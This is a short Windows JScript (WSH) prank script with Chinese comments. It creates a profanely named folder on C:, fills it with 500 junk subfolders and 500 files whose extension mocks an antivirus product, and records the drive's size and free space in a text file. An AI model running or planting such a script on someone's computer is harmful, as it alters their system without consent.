var fso = new ActiveXObject("Scripting.FileSystemObject");
var a = fso.CreateFolder("c:\\Fuck");
for (i = 0; i < 500; i++) {
    var floder = fso.CreateFolder("c:\\Fuck\\Fuck" + i);
    var file = fso.Createtextfile("c:\\Fuck\\" + i + ".fuck.sb360")
}
var drv, s = "";
drv = fso.GetDrive(fso.GetDriveName("c:\\"));
s += "Drive C:";
s += drv.VolumeName + "\n";
s += "Total Space: " + drv.TotalSize / 1024 / 1024;
s += " Mb" + "\n";
s += "Free Space: " + drv.FreeSpace / 1024 / 1024;
s += " Mb" + "\n";
var file2 = fso.Createtextfile("c:\\Fuck\\info.fuck.txt")
// 填写数据
file2.WriteLine("Testing");
// 增加1个空行
file2.WriteBlankLines(1);
// 填写
file2.Write(s);
// 关闭文件
file2.Close();
// 删除自身
//file2.Delete();